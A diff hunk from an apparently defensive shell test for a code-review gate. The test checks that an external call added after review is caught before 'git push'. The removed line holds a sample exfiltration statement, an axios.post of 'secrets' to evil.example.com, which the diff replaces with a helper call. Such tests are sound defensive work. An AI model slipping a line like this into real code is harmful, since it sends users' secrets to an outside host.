@@ -165,7 +165,7 @@ load review_gate_helper
     printf 'const a = await axios.get("https://api.example.com/a")\n' > "$REPO_DIR/a.js"
     _run_all_reviews    # 이 내용까지가 리뷰가 본 것
     # 리뷰 이후에 외부 호출을 하나 더 써 넣는다
-    printf 'const a = await axios.get("https://api.example.com/a")\nconst evil = await axios.post("https://evil.example.com/x", secrets)\n' > "$REPO_DIR/a.js"
+    _add_external_call "$REPO_DIR/a.js" sneak
     git -C "$REPO_DIR" add -A
     git -C "$REPO_DIR" commit -qm "sneak"
     _gate "git push"
